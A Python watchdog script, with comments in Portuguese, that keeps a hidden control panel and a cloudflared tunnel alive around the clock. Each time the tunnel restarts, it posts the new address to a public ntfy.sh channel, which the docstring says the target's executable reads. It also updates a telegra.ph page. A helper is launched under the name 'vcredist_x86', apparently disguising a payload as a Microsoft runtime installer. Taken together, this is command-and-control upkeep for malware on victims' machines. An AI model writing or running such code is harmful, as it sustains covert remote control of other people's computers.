"""Vigia do site: mantem golive, painel e tunel de pe 24h.

Cadeia: site.vbs -> keep_site.py -> golive.py -> web.py + deliver.py + cloudflared

O que ele garante, a cada 30s:
  * golive.py rodando (se cair, sobe de novo)
  * cloudflared rodando e o link respondendo 200 (se cair, reabre e repointa
    a pagina permanente do telegra.ph pro endereco novo)
"""
import os
import re
import subprocess
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PYW = os.path.join(os.environ.get("LOCALAPPDATA", ""),
                   r"Programs\Python\Python312\pythonw.exe")
if not os.path.isfile(PYW):
    PYW = sys.executable
CF = os.path.join(HERE, "cloudflared.exe")
LOG = os.path.join(HERE, "tunnel.log")
PANEL_LINK = os.path.join(HERE, "panel_link.txt")
TOKEN = "t9x4m2k7q3"
KEY = "raf-7c1f4b2e9a3d5f8b6c0e2a4d"
PANEL_PORT = 8080
CHANNEL = "https://ntfy.sh/raf-raf7c1f4b2e9a3d5f8b6c0e2a4d-cfg"
HIDDEN = 0x08000000
URL_RE = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")


def _run(args, timeout=40):
    try:
        r = subprocess.run(args, capture_output=True, text=True,
                           creationflags=HIDDEN, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception:
        return ""


def _pids(needle):
    out = _run(["powershell", "-NoProfile", "-NonInteractive", "-Command",
                "Get-CimInstance Win32_Process | ForEach-Object { "
                "\"$($_.ProcessId) $($_.CommandLine)\" }"])
    hits = []
    for line in out.splitlines():
        if needle in line:
            try:
                hits.append(int(line.split()[0]))
            except (ValueError, IndexError):
                pass
    return hits


def _link_atual():
    try:
        with open(PANEL_LINK, encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return ""


def _url_ok(url, timeout=12):
    if not url:
        return False
    base = url.split("/?")[0].rstrip("/")
    try:
        req = urllib.request.Request(base + "/?t=" + TOKEN,
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status == 200
    except Exception:
        return False


def _sobe_golive():
    if _pids("golive.py"):
        return False
    args = [PYW, os.path.join(HERE, "golive.py"), "--watch", "--no-publish",
            "--log", "golive.log", "--key", KEY, "--token", TOKEN,
            "--theme", "vcredist", "--exe-name", "vcredist_x86",
            "--pad", "270141"]
    try:
        subprocess.Popen(args, cwd=HERE, creationflags=HIDDEN,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[keep] golive estava fora -- subi de novo", flush=True)
        return True
    except Exception as exc:
        print("[keep] falha subindo golive: %s" % exc, flush=True)
        return False


def _sobe_tunel():
    for pid in _pids("cloudflared.exe"):
        try:
            subprocess.run(["taskkill", "/F", "/PID", str(pid)],
                           creationflags=HIDDEN, capture_output=True)
        except Exception:
            pass
    time.sleep(2)
    try:
        with open(LOG, "w", encoding="utf-8") as f:
            subprocess.Popen([CF, "tunnel", "--url",
                              "http://127.0.0.1:%d" % PANEL_PORT,
                              "--no-autoupdate"],
                             cwd=HERE, creationflags=HIDDEN,
                             stdout=subprocess.DEVNULL, stderr=f)
    except Exception as exc:
        print("[keep] falha subindo tunel: %s" % exc, flush=True)
        return ""
    url = ""
    for _ in range(45):
        time.sleep(1)
        try:
            with open(LOG, encoding="utf-8", errors="replace") as f:
                m = URL_RE.search(f.read())
            if m:
                url = m.group(0)
                break
        except OSError:
            pass
    return url


def _publica_canal(url):
    """Grava o endereco vivo no canal publico: o exe do alvo le daqui."""
    import json
    body = json.dumps({"base": url.rstrip("/"), "ts": int(time.time()),
                       "ok": True}).encode()
    try:
        req = urllib.request.Request(CHANNEL, data=body, method="POST",
                                     headers={"User-Agent": "Mozilla/5.0",
                                              "Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=20) as r:
            print("[keep] canal : %s" % url, flush=True)
            return r.status == 200
    except Exception as exc:
        print("[keep] canal falhou: %s" % exc, flush=True)
        return False


def _repointa(url):
    link = "%s/?t=%s" % (url.rstrip("/"), TOKEN)
    _publica_canal(url)
    try:
        with open(PANEL_LINK, "w", encoding="utf-8") as f:
            f.write(link + "\n")
    except OSError:
        pass
    try:
        sys.path.insert(0, HERE)
        import panel_page
        st = panel_page.update(link)
        print("[keep] pagina permanente : %s" % st.get("url"), flush=True)
    except Exception as exc:
        print("[keep] pagina permanente falhou: %s" % exc, flush=True)


def main():
    print("[keep] vigia iniciado", flush=True)
    falhas = 0
    while True:
        try:
            _sobe_golive()

            if not _pids("cloudflared.exe"):
                print("[keep] tunel fora -- reabrindo", flush=True)
                url = _sobe_tunel()
                if url:
                    _repointa(url)
                    print("[keep] novo link : %s" % url, flush=True)
                falhas = 0
            elif not _url_ok(_link_atual()):
                falhas += 1
                print("[keep] link sem resposta (%d/3)" % falhas, flush=True)
                if falhas >= 3:
                    url = _sobe_tunel()
                    if url:
                        _repointa(url)
                        print("[keep] novo link : %s" % url, flush=True)
                    falhas = 0
            else:
                falhas = 0
        except Exception as exc:
            print("[keep] erro: %s" % exc, flush=True)
        time.sleep(30)


if __name__ == "__main__":
    main()
